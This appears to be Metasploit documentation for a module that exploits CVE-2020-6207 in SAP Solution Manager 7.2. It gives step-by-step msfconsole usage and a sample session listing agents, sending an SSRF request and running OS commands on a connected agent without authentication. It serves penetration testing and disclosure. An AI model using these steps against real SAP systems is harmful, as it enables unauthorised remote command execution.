## Vulnerable Application
This module exploits the CVE-2020-6207 vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem) of
SAP Solution Manager (SolMan) running version 7.2. The vulnerability occurs due to missing authentication
checks when submitting SOAP requests to the /EemAdminService/EemAdmin page to get information about connected SMDAgents,
send HTTP request (SSRF), and execute OS commands on connected SMDAgent. Works stable in connected SMDAgent with Java version 1.8.

Successful exploitation of the vulnerability enables unauthenticated remote attackers to achieve SSRF and execute OS commands from the agent connected
to SolMan as a user from which the SMDAgent service starts, usually the daaadm.

Paper: [An Unauthenticated Journey to Root][1]

### Application Background
In SAP landscapes, SolMan could be compared to a domain controller system in the Microsoft world.
It is a technical system that is tightly connected to all other SAP systems with high privileges.
Once an SAP system is connected to the solution manager, it receives the name of a "managed" or "satellite" system.
As an administration solution, SolMan is intended to centralize the management of all systems within the landscape by
performing actions such as implementing, supporting, monitoring and maintaining the enterprise solutions.

### Installation Steps
Steps to install, configure and manage SolMan can be found online at [this page][2].

Once set up and configured, the instances will be vulnerable on the default HTTP port 50000.

## Verification Steps

1. Start msfconsole
1. Do: `workspace [WORKSPACE]`
1. Do: `use auxiliary/admin/sap/sap_2020_6207_solman_rce`
1. Do: `set RHOSTS [IP]`
1. Do: `set action LIST`
1. Do: `run`
1. Verify that a list of connected agents was returned.
1. Do: `set AGENT [Connected agent server name]`
1. Do: `set SSRF_METHOD [GET, POST, PUT, DELETE, PATCH, ...]`
1. Do: `set SSRF_URI [SSRF uri, example - http://1.1.1.1/test.html]`
1. Do: `set action SSRF`
1. Do: `run`
1. Verify that the HTTP request from the connected agent has been sent.
1. Do: `set AGENT [Connected agent server name]`
1. Do: `set COMMAND [OS command, example - ping -c 4 1.1.1.1]`
1. Do: `set action EXEC`
1. Do: `run`
1. Verify that the OS command has been executed on the connected agent.

## Options

### TARGETURI

This is the path to the EEM admin page of the SolMan that is vulnerable to CVE-2020-6207.
By default, it is set to `/EemAdminService/EemAdmin`. However, it can be changed if SolMan
was installed at a path different from that of the web root. For example, if the SolMan
server was proxied to the `/solman/` path under the web root, then this value would be
set to `/solman/EemAdminService/EemAdmin`.

### AGENT

Connected agent sever name.
Example: `linux_agent`

### SSRF_METHOD

HTTP method for sending HTTP request from a connected agent, the server name of which is specified in the `AGENT` option.
Example: `GET`

### SSRF_URI

URI for sending HTTP requests from a connected agent, the server name of which is specified in the `AGENT` option.
Example: `http://1.1.1.1/test.html`

### COMMAND

OS command for executing in connected agent, the server name of which is specified in the `AGENT` option.
Example: `ping -c 4 1.1.1.1`

## Actions
```
   Name  Description
   ----  -----------
   EXEC  Exec OS command on connected agent
   LIST  List connected agents
   SSRF  Send SSRF from connected agent
```

## Scenarios

### Vulnerable SolMan 7.2 running on agent: test_linux with OS: Linux and java version: 1.8

```
msf6 > workspace -a SAP_TEST
[*] Added workspace: SAP_TEST
[*] Workspace: SAP_TEST
msf6 > use auxiliary/admin/sap/cve_2020_6207_solman_rce
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION LIST
ACTION => LIST
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set RHOST 172.16.30.46
RHOST => 172.16.30.46
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
[*] Running module against 172.16.30.46

[*] Getting a list of agents connected to the Solution Manager: 172.16.30.46
[+] Successfully retrieved agent list:
Connected Agents List
=====================

 Server Name   Host Name                Instance Name  OS Name                 Java Version
 -----------   ---------                -------------  -------                 ------------
 test_windows  SAP731.corp.test.com     SMDA97         Windows Server 2008 R2  1.6.0_29
 test_linux    SAPERP7.corp.test.com    SMDA98         Linux                   1.8.0_25

[*] Auxiliary module execution completed
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION SSRF
ACTION => SSRF
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
AGENT => test_linux
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SSRF_METHOD PUT
SSRF_METHOD => PUT
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SSRF_URI http://192.168.50.3:7777/
SSRF_URI => http://192.168.50.3:7777/
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
[*] Running module against 172.16.30.46

[*] Enable EEM on agent: test_linux
[*] Start script: 36al0keSSTeh with SSRF payload on agent: test_linux
[*] Stop script: 36al0keSSTeh on agent: test_linux
[*] Delete script: 36al0keSSTeh on agent: test_linux
[+] Send SSRF: 'PUT http://192.168.50.3:7777/ HTTP/1.1' from agent: test_linux
[*] Auxiliary module execution completed
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION EXEC
ACTION => EXEC
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
AGENT => test_linux
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set COMMAND ping -c 4 192.168.50.3
COMMAND => ping -c 4 192.168.50.3
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
[*] Running module against 172.16.30.46

[*] Enable EEM on agent: test_linux
[*] Start script: qAPSRKSCysFf with RCE payload on agent: test_linux
[*] Stop script: qAPSRKSCysFf on agent: test_linux
[*] Delete script: qAPSRKSCysFf on agent: test_linux
[+] Execution command: 'ping -c 4 192.168.50.3' on agent: test_linux
[*] Auxiliary module execution completed
msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > services
Services
========

host          port   proto  name  state  info
----          ----   -----  ----  -----  ----
172.16.30.46  50000  tcp    soap  open   SAP Solution Manager

msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > vulns

Vulnerabilities
===============

Timestamp                Host          Name                                                            References
---------                ----          ----                                                            ----------
2021-03-25 14:01:33 UTC  172.16.30.46  SAP Solution Manager remote unauthorized OS commands execution  CVE-2020-6207,URL-https://i.blackhat.com/USA-20/Wednesday/us-20-
                                                                                                       Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-E
                                                                                                       nterprise-Software-Servers-wp.pdf,URL-https://github.com/chipik/
                                                                                                       SAP_EEM_CVE-2020-6207

```

[1]: https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf
[2]: https://blogs.sap.com/2016/02/16/solution-manager-72-installation-and-configuration-i-installations/
